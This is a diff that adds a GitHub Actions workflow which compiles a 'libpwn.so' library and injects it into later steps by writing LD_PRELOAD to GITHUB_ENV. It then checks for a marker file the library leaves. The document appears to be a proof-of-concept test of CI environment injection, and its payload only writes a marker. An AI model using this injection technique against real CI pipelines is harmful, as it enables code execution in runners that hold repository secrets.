@@ -1,0 +1,32 @@
+name: zz-lottie-ldpreload
+on: workflow_dispatch
+
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: build payload .so
+        run: |
+          cat > pwn.c <<'C'
+          #include <stdio.h>
+          #include <unistd.h>
+          __attribute__((constructor)) static void p(void) {
+            FILE *f = fopen("/tmp/pwned_ld.txt", "a");
+            if (f) { fprintf(f, "PWNED_LD_PRELOAD pid=%d\n", getpid()); fclose(f); }
+            fprintf(stderr, "PWNED_LD_PRELOAD_MARKER pid=%d\n", getpid());
+          }
+          C
+          gcc -shared -fPIC -o "$GITHUB_WORKSPACE/libpwn.so" pwn.c && ls -l libpwn.so
+      - name: inject LD_PRELOAD via GITHUB_ENV
+        run: |
+          echo "LD_PRELOAD=$GITHUB_WORKSPACE/libpwn.so" >> "$GITHUB_ENV"
+          echo "injecting LD_PRELOAD=$GITHUB_WORKSPACE/libpwn.so"
+      - name: later node action
+        uses: actions/github-script@v6
+        with:
+          script: |
+            console.log('github-script body running');
+      - name: evidence
+        if: always()
+        run: |
+          echo "--- /tmp/pwned_ld.txt ---"; cat /tmp/pwned_ld.txt 2>&1 || echo NOT_EXECUTED
